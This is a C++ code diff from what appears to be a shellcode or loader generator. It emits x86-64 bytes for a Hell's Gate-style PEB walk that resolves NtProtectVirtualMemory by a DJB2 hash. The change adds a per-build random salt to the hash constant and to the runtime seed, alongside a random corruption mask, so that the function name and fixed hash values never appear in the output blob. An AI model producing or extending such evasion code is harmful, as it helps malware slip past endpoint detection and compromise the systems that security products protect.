@@ -80,10 +80,15 @@ public:
         // Per-build random corruption mask (non-zero).
         const uint32_t corruption = rng.next_u32() | 1u;
 
-        // DJB2 hash of the target function name, computed at build
-        // time so the literal name never appears in the blob.
-        constexpr uint32_t kTargetHash =
-            djb2_ascii_hash("NtProtectVirtualMemory");
+        // Per-build random salt for the DJB2 hash. The build-time
+        // `djb2_ascii_hash_salted` and the runtime scan loop's
+        // initial seed both fold this salt in, so the same salt
+        // must flow through both the target hash constant and the
+        // `mov eax, <5381 ^ salt>` seed emission below. See the
+        // header docs for the P5 rationale.
+        const uint32_t salt        = rng.next_u32();
+        const uint32_t target_hash = djb2_ascii_hash_salted(
+            "NtProtectVirtualMemory", salt);
 
         // --------------------------------------------------------
         // Walker — mirrors the Hell's Gate resolver's PEB walk and
@@ -148,8 +153,15 @@ public:
         // lea rdx, [rbx + rax]               48 8D 14 03           ; rdx = name ptr
         e.u8(0x48); e.u8(0x8D); e.u8(0x14); e.u8(0x03);
 
-        // mov eax, 5381                      B8 05 15 00 00        ; DJB2 init
-        e.u8(0xB8); e.u8(0x05); e.u8(0x15); e.u8(0x00); e.u8(0x00);
+        // mov eax, <5381 ^ salt>             B8 imm32              ; DJB2 init
+        {
+            const uint32_t seed = 5381u ^ salt;
+            e.u8(0xB8);
+            e.u8(static_cast<uint8_t>(seed));
+            e.u8(static_cast<uint8_t>(seed >> 8));
+            e.u8(static_cast<uint8_t>(seed >> 16));
+            e.u8(static_cast<uint8_t>(seed >> 24));
+        }
 
         // .hash_loop:
         const size_t label_hash_loop = e.size();
@@ -183,9 +195,9 @@ public:
         const size_t label_hash_done = e.size();
         patch_rel8(e, patch_jz_hash_done, label_hash_done);
 
-        // cmp eax, <kTargetHash>             3D imm32
+        // cmp eax, <target_hash>             3D imm32
         e.u8(0x3D);
-        e.u32(kTargetHash);
+        e.u32(target_hash);
         // jne short .next                    75 rel8
         e.u8(0x75);
         const size_t patch_jne_next = e.size();
